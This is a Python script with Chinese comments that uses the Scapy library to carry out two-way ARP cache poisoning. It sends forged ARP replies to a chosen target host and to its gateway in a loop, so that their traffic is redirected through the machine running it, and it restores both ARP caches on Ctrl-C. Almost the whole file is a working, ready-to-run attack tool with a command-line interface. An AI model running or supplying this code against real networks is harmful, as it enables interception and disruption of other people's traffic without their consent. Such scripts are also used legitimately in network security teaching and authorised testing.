from scapy.all import *
from scapy.layers.l2 import getmacbyip
import sys
from optparse import OptionParser

# 进行双向欺骗
def attack_target(gateway_ip, gateway_mac, target_ip, target_mac):

    '''
    ARP报文结构
    >>> ls(Ether())
    WARNING: Mac address to reach destination not found. Using broadcast.
    dst        : DestMACField                        = 'ff:ff:ff:ff:ff:ff' ('None')
    src        : SourceMACField                      = '00:50:56:30:c4:71' ('None')
    type       : XShortEnumField                     = 36864           ('36864')

    ARP报文
    >>> ls(ARP())
    hwtype     : XShortEnumField                     = 1               ('1')
    ptype      : XShortEnumField                     = 2048            ('2048')
    hwlen      : FieldLenField                       = None            ('None')
    plen       : FieldLenField                       = None            ('None')
    op         : ShortEnumField                      = 1               ('1')
    hwsrc      : MultipleTypeField (SourceMACField, StrFixedLenField) = '00:50:56:30:c4:71' ('None')
    psrc       : MultipleTypeField (SourceIPField, SourceIP6Field, StrFixedLenField) = '172.22.194.24' ('None')
    hwdst      : MultipleTypeField (MACField, StrFixedLenField) = '00:00:00:00:00:00' ('None')
    pdst       : MultipleTypeField (IPField, IP6Field, StrFixedLenField) = '0.0.0.0'       ('None')
    '''
    
    # 构造ARP包

    # 欺骗目标主机
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    # 欺骗网关
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[*] 正在进行ARP攻击. [Ctrl-C 停止进行]")

    while True:
        try:
            # 循环发送ARP包
            send(poison_target)
            send(poison_gateway)
            # 推迟执行，避免过于频繁影响网络
            time.sleep(2)

        except KeyboardInterrupt:
            # 进行ARP缓冲恢复
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
            break
    print("[*] ARP攻击结束")

    return

# arp缓冲表恢复
def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] 恢复arp缓冲")

    send(ARP(op = 2, psrc = gateway_ip, pdst = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 5)
    send(ARP(op = 2, psrc = target_ip, pdst = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac))

def main():

    # 操作提示
    usage = 'sudo python arpattack [-i interface] [-g gateway] host'
    parser = OptionParser(usage)

    parser.add_option('-i', dest = 'interface', type = 'string', help = '网卡')
    parser.add_option('-g', dest = 'gateway', type = 'string', help = '网关')


    # 解析命令行
    (options, args) = parser.parse_args()
    if len(args) != 1 or options.interface is None or options.gateway is None:
        # 输出使用提示
        parser.print_help()
        sys.exit(0)

    # 网卡
    interface = options.interface
    # 网关
    gateway_ip = options.gateway
    # 目标ip
    target_ip = args[0]
    # 设置网卡
    conf.iface = interface  
    # 关闭提示信息
    conf.verb = 0

    print("[*]网卡： %s"%interface)

    # 获取网卡MAC
    gateway_mac = getmacbyip(str(gateway_ip))

    if gateway_mac is None:
        print("[!] 获取网关MAC失败. Exiting")
        sys.exit(0)
    else:
        print("[*] 网关： %s MAC: %s"%(gateway_ip,gateway_mac))

    # 获取目标主机MAC
    target_mac = getmacbyip(str(target_ip))

    if target_mac is None:
        print("[!] 获取目标主机MAC失败. Exiting")
        sys.exit(0)
    else:
        print("[*] 目标主机： %s MAC: %s"%(target_ip,target_mac))

    # 进行欺骗
    attack_target(gateway_ip, gateway_mac, target_ip, target_mac)

if __name__ == "__main__":
    main()
